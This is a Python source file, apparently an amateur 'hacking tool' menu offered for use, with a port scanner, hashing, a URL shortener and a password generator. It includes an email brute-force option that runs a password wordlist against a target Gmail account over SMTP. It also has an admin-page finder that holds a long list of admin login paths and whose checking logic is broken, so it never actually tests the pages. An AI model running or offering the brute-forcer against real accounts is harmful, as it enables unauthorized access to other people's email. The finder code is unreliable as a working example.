from colorama import *
import random
from time import sleep
import socket
import smtplib
import hashlib
import pyshorteners

# IF YOU HAVE ERROR WITH THIS FOLLOW THE STEP's :
# 1- OPEN " CMD " BY CLICKING ON " WINDOWS + R "
# 2- WRITE INSIDE THE " CMD " pip3 install [name of module you dont have]
# 3- IF YOU HAVE ANY PROBLEM CONTACT WITH ME AT MY INSTAGRAM : @iamlindos

                  # HOPE YOU ENJOY MY FIRST TOOL *^* #

print(Fore.RED + """

MMP""MM""YMM `7MM               `7MM"'"YMM                  
P'   MM   `7   MM                 MM    `7                  
     MM        MMpMMMb.  .gP"Ya   MM   d `7M'   `MF'.gP"Ya  
     MM        MM    MM ,M'   Yb  MMmmMM   VA   ,V ,M'   Yb 
     MM        MM    MM 8M``````  MM   Y  , VA ,V  8M`````` 
     MM        MM    MM YM.    ,  MM     ,M  VVV   YM.    , 
   .JMML.    .JMML  JMML.`Mbmmd'.JMMmmmmMMM  ,V     `Mbmmd' 
                                            ,V              
                                         OOb"
""")

print(Fore.LIGHTWHITE_EX + """
               ---------------------------
               | [+] insta : @ IamLindos |
               ---------------------------
 =========================[ $$$ ]=========================
------------------------------------------------------------
| [1] Get IP From Site     [5] URL Cut                     |
| --------------------     -----------------               | 
| [2] Port Scanner         [6] Brute-Force Email           |
| --------------------     -----------------               |
| [3] Encrypt              [7] Decrypt [ Soon .. ]         |                   
| --------------------     -----------------               | 
| [4] Admin Page Finder    [8] Strong Password Generator   |
------------------------------------------------------------

""")

value = input("[#] Choose Number : ")

########################################

def design() :
    print("======================")

def coded() :
    print(Fore.LIGHTWHITE_EX + "\n --------------# Coded By : @ IamLindos - TheEye #-------------- ")
    print(Fore.LIGHTBLACK_EX + "          --------# Thanks For Using This Tool #-------- ")
    print(Fore.LIGHTRED_EX + "                   -------# Made With Love #------- \n")

########################################

if value == "1" :
    design()
    ex = print("EX. [ Example.com ]")
    victim = input("[#] Enter Your Target : ")
    ip = socket.gethostbyname(victim)
    result = print("[+] IP Of The Target : ", ip)
    
    coded()

elif value == "2" :
    print("""
    0 : Open
    -------------
    10061 : Closed
    """)
    ip_port = input("[#] Enter Your Target IP : ")
    portlist = [80,443,21,20,4444,135,445,23,22,912,8888,98]
    for port1 in portlist:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        result = sock.connect_ex((ip_port,port1))
        print(port1, ":", result)
        sock.close()

    coded()

elif value == "3" :
    print("""
    -------------------
    | [1] md5         |
    | [2] sha1        |
    | [3] sha512      |
    -------------------
    """)
    encrypt_type = input("[#] Which Type Of Encrypt You Want : ")
    if encrypt_type == "1" :
        encrypt = input("Word : ")
        en = encrypt.encode()
        result = hashlib.md5(en)
        print("[+] Your Hash : \n >> ", result.hexdigest())

    elif encrypt_type == "2" :
        encrypt = input("Word : ")
        en = encrypt.encode()
        result = hashlib.sha1(en)
        print("[+] Your Hash : \n >> ", result.hexdigest())

    elif encrypt_type == "3" :
        encrypt = input("Word : ")
        en = encrypt.encode()
        result = hashlib.sha512(en)
        print("[+] Your Hash : \n >> ", result.hexdigest())

    else :
        print("[!] Invalid Syntax")

    coded()

elif value == "4" :
    ex = print("EX. https://example.com/")
    page = input("[#] URL Here : ")
    random_pages = ("""""" 'admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html'
"""""")

    for admin in random_pages :
        website = page + admin
        # must be some changes here - WEB BROWSER CHECK IF VALID OR NOT
        if website == page :
            print(Fore.GREEN + "[+] Admin Page Found >> ", website)
        else :
            sleep(0.5)
            print(Fore.RED + "[!] Admin Page Not Found >> ", website)

    coded()


elif value == "5" :
    url = input("[#] URL Here : ")
    shorter = pyshorteners.Shortener()
    print("[+] Your Short URL >> ", shorter.tinyurl.short(url))

    coded()

elif value == "6" :
    print(Fore.BLUE + """
------------------
|   [1] Email    |   
------------------ 
""")

    num_email = input("\n [#] Choose Number : ")

    if num_email == "1" :
        design()
        smtpserver = smtplib.SMTP("smtp.gmail.com",587)
        smtpserver.ehlo()
        smtpserver.starttls()

        email1 = input("[*] Enter The Target Email : ")
        Passwordfile = input("[*] Enter Password File : ")
        design()
        Passwordfile_open = open(Passwordfile, "r")

        for Password1 in Passwordfile_open :
            try :
                smtpserver.login(email1, Password1)
                print(Fore.GREEN + "[+] Password Found >> ",Password1)
                break

            except smtplib.SMTPAuthenticationError :
                print(Fore.RED + "[!] Password Incorrecr >> ", Password1)

        coded()

 ###

elif value == "7" :
    design()
    print(Fore.YELLOW + """
    ----------------
    | [%] Soon ... |
    ----------------
    """)

 ###

elif value == "8" :
    length = int(input("[#] How Many Password's Do You Want : "))
    password_long = int(input("[#] How Many Character's Do You Want : "))
    for i in range(int(length)) :
        lower = "abcdefghijklmnopqrstuvwxyz"
        upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        numbers = "1234567890"
        symbols = "!@#$%&*-_."
        together = lower + upper + numbers + symbols

        password = "".join(random.sample(together, password_long))
        sleep(0.2)
        design()
        print( Fore.LIGHTGREEN_EX + "[+] ", password)

    coded()